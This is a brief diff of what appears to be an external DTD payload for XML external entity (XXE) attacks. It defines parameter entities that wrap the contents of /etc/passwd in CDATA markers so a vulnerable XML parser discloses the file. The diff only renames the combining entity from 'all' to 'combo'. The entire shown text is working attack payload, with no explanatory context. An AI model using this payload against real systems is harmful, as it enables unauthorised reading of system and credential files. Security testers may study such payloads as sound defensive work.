@@ -2,4 +2,4 @@
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % goodies SYSTEM "file:///etc/passwd">
 <!ENTITY % end "]]>">
-<!ENTITY all '%start;%goodies;%end;'>
+<!ENTITY combo '%start;%goodies;%end;'>
